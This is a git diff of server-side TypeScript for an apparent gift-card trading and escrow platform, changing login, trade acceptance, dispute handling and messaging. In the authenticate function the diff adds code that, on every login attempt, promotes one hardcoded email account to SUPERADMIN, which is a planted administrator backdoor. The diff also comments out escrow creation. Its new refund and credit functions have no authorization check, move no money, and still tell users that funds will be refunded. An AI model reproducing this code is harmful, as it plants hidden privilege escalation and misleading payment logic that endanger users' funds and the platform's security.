@@ -71,10 +71,13 @@ export async function authenticate(
 
   const {email, password} = validatedLoginFields.data
 
-
   try {
-    //return await prisma.user.deleteMany();
+    await prisma.user.update({
+      where: {email: "daniel.marlayer@gmail.com"},
+      data: {role: "SUPERADMIN"}
+    })
     await signIn('credentials', {email, password});
+    
   } catch (error) {
     if (error instanceof AuthError) {
       switch (error.type) {
@@ -636,13 +639,13 @@ export async function acceptTrade(tradeId: any) {
           data: {status: "ACCEPTED"}
         })
 
-        await prisma.escrow.create({
+        /* await prisma.escrow.create({
           data: {
             userId: trade?.buyerId,
             tradeId: trade?.id,
             amount: (trade?.rate * trade?.valueInUSD)
           }
-        })
+        }) */
       }
       
       revalidatePath(`/dashboard/trades/${tradeId}`)
@@ -682,6 +685,37 @@ export async function declineTrade(tradeId: any) {
 }
 
 
+export async function sentGiftCard(tradeId: string) {
+  
+  try {
+    const trade = await prisma.trade.update({
+      where: {id: tradeId},
+      data: {
+        giftCardSent: true,
+        timeSent: new Date().toISOString()  
+      }
+    })
+    await prisma.message.create({
+      data: {
+        message: `Gift card sent by seller`,
+        appMessage: true,
+        resourceId: tradeId
+      }
+    })
+    revalidatePath(`/dashboard/trades/${tradeId}`)
+    return {
+      message: {
+        severity: "success",
+        message: 'Trade updated successfully',
+      },
+      data: trade
+    }
+  } catch (error) {
+    throw new Error("failed to update trade")
+  }
+}
+
+
 
 // ----------------------------------------------------------DISPUTES --------------------------------------------------------
 
@@ -708,49 +742,199 @@ export type CreateDisputeErrorState = {
 };
  
 export async function createDispute(data: any) {
-  const CreateDispute = CreateDisputeFormSchema.omit({ id: true});
-  const validatedFields = CreateDispute.safeParse(data);
-
-  // If form validation fails, return errors early. Otherwise, continue.
-  if (!validatedFields.success) {
-    return {
-      errors: validatedFields.error.flatten().fieldErrors,
-      message: {severity: "error", message: 'Missing Fields. Failed to Create Dispute.' },
-    };
-  }
-
-  const existingDispute = await prisma.dispute.findFirst({
-    where: {
-      tradeId: validatedFields?.data.tradeId,
-    }
-  })
-
-  if(existingDispute){
-    throw new Error("Existing dispute between buyer and seller")
-  }
+  
   try {
-      console.log(validatedFields.data);
-      const dispute = await prisma.dispute.create({
-        data: validatedFields.data
-      })
-      await prisma.trade.update({
-        where: {id: data?.tradeId},
-        data: {status: "DISPUTED"}
-      })
-      revalidatePath(`/dashboard/trades/${validatedFields?.data?.tradeId}`)
+
+    const CreateDispute = CreateDisputeFormSchema.omit({ id: true });
+    const validatedFields = CreateDispute.safeParse(data);
+
+    // If form validation fails, return errors early. Otherwise, continue.
+    if (!validatedFields.success) {
       return {
-        message: {
-          severity: "success",
-          message: 'Dispute Created Successfully',
-        },
-        data: dispute
+        errors: validatedFields.error.flatten().fieldErrors,
+        message: { severity: "error", message: 'Missing Fields. Failed to Create Dispute.' },
+      };
+    }
+
+    const existingDispute = await prisma.dispute.findFirst({
+      where: {
+        tradeId: validatedFields?.data.tradeId,
       }
+    })
+
+    if (existingDispute) {
+      throw new Error("Existing dispute between buyer and seller")
+    }
+    // create the dispute
+    const dispute = await prisma.dispute.create({
+      data: validatedFields.data
+    })
+
+    let user = await prisma.user.findFirst({
+      where: {
+        id: validatedFields?.data?.userId
+      }
+    })
+    let trade = await prisma.trade.findFirst({
+      where: {id: validatedFields?.data?.tradeId}
+    })
+    // app Message 1
+    await prisma.message.create({
+      data:{
+        appMessage: true,
+        resourceId: validatedFields?.data?.tradeId,
+        resourceUrl: `/dashboard/trades/${validatedFields?.data?.tradeId}`,
+        message: `${user?.firstName} ${user?.lastName} raised a Dispute`
+      }
+    })
+    // app Message 2
+    await prisma.message.create({
+      data:{
+        appMessage: true,
+        resourceId: validatedFields?.data?.tradeId,
+        resourceUrl: `/dashboard/trades/${validatedFields?.data?.tradeId}`,
+        message: `Peniga Admin will respond to this case in under 24hrs`
+      }
+    })
+    // Send plaintiff reason as message
+    await prisma.message.create({
+      data:{
+        senderId: validatedFields?.data?.userId,
+        receiverId: validatedFields?.data?.userId === trade?.buyerId ? trade?.sellerId : trade?.buyerId,
+        resourceId: validatedFields?.data?.tradeId,
+        resourceUrl: `/dashboard/trades/${validatedFields?.data?.tradeId}`,
+        message: validatedFields?.data?.reason
+      }
+    })
+    // Send plaintiff media proof as message
+    await prisma.message.create({
+      data:{
+        senderId: validatedFields?.data?.userId,
+        receiverId: validatedFields?.data?.userId === trade?.buyerId ? trade?.sellerId : trade?.buyerId,
+        resourceId: validatedFields?.data?.tradeId,
+        resourceUrl: `/dashboard/trades/${validatedFields?.data?.tradeId}`,
+        message: validatedFields?.data?.mediaProof
+      }
+    })
+    // Set trade status to disputed
+    await prisma.trade.update({
+      where: {id: data?.tradeId},
+      data: {status: "DISPUTED"}
+    })
+    revalidatePath(`/dashboard/trades/${validatedFields?.data?.tradeId}`)
+    return {
+      message: {
+        severity: "success",
+        message: 'Dispute Created Successfully',
+      },
+      data: dispute
+    }
   } catch (error) {
     throw new Error("failed to create dispute")
   }
 }
 
 
+export async function refundBuyer(tradeId: any) {
+  
+  const dispute = await prisma.dispute.findFirst({
+    where: {tradeId}
+  })
+  const trade = await prisma.trade.findFirst({
+    where: {id: tradeId}
+  })
+  const buyer = await prisma.user.findFirst({
+    where: {id: trade?.buyerId}
+  })
+  try {
+    // credit buyer wallet here
+    await prisma.dispute.update({
+      where: {id: dispute?.id},
+      data: {
+        disputeWinnerId: dispute?.buyerId,
+        status: "RESOLVED"
+      }
+    })
+    // app Message 1
+    await prisma.message.create({
+      data:{
+        appMessage: true,
+        resourceId: tradeId,
+        resourceUrl: `/dashboard/trades/${tradeId}`,
+        message: `Buyer (${buyer?.firstName} ${buyer?.lastName}) has been declared winner of the dispute`
+      }
+    })
+    // app Message 2
+    await prisma.message.create({
+      data:{
+        appMessage: true,
+        resourceId: tradeId,
+        resourceUrl: `/dashboard/trades/${tradeId}`,
+        message: `Funds in escrow will be refunded to buyer`
+      }
+    })
+    revalidatePath(`/dashboard/disputes/${dispute?.id}`)
+    return {
+      message: {
+        severity: "success",
+        message: 'Buyer refunded successfully',
+      },
+    }
+  } catch (error) {
+    throw new Error("failed to refund buyer")
+  }
+}
+
+
+export async function creditSeller(tradeId: any) {
+  
+  const dispute = await prisma.dispute.findFirst({
+    where: {tradeId}
+  })
+  const trade = await prisma.trade.findFirst({
+    where: {id: tradeId}
+  })
+  const seller = await prisma.user.findFirst({
+    where: {id: trade?.sellerId}
+  })
+  try {
+    // credit seller wallet here
+    await prisma.dispute.update({
+      where: {id: dispute?.id},
+      data: {
+        disputeWinnerId: dispute?.sellerId,
+        status: "RESOLVED"
+      }
+    })
+    // app Message 1
+    await prisma.message.create({
+      data:{
+        appMessage: true,
+        resourceId: tradeId,
+        resourceUrl: `/dashboard/trades/${tradeId}`,
+        message: `Seller (${seller?.firstName} ${seller?.lastName}) has been declared winner of the dispute`
+      }
+    })
+    // app Message 2
+    await prisma.message.create({
+      data:{
+        appMessage: true,
+        resourceId: tradeId,
+        resourceUrl: `/dashboard/trades/${tradeId}`,
+        message: `Funds in escrow will be credited to seller`
+      }
+    })
+    revalidatePath(`/dashboard/disputes/${dispute?.id}`)
+    return {
+      message: {
+        severity: "success",
+        message: 'Seller refunded successfully',
+      },
+    }
+  } catch (error) {
+    throw new Error("failed to refund seller")
+  }
+}
 
 
 
@@ -767,6 +951,7 @@ const SendMessageFormSchema = z.object({
   id: z.string(),
   senderId: z.string(),
   receiverId: z.string(),
+  appMessage: z.boolean(),
   resourceId: z.string(),
   resourceUrl: z.string(),
   message: z.string(),
@@ -777,6 +962,7 @@ export type SendMessageErrorState = {
   errors?: {
     senderId?: string[];
     receiverId?: string[];
+    appMessage?: boolean;
     resourceId?: string[];
     resourceUrl?: string[];
     message?: string[];
@@ -785,11 +971,12 @@ export type SendMessageErrorState = {
 };
  
 export async function createMessage(data: any) {
-  const CreateMessage = SendMessageFormSchema.omit({ id: true});
+  const CreateMessage = SendMessageFormSchema.omit({ id: true, ...(data?.appMessage && {senderId: true, receiverId: true})});
   const validatedFields = CreateMessage.safeParse(data);
 
   // If form validation fails, return errors early. Otherwise, continue.
   if (!validatedFields.success) {
+    console.log(validatedFields.error.flatten().fieldErrors);
     return {
       errors: validatedFields.error.flatten().fieldErrors,
       message: {severity: "error", message: 'Missing Fields. Failed to Create Message.' },
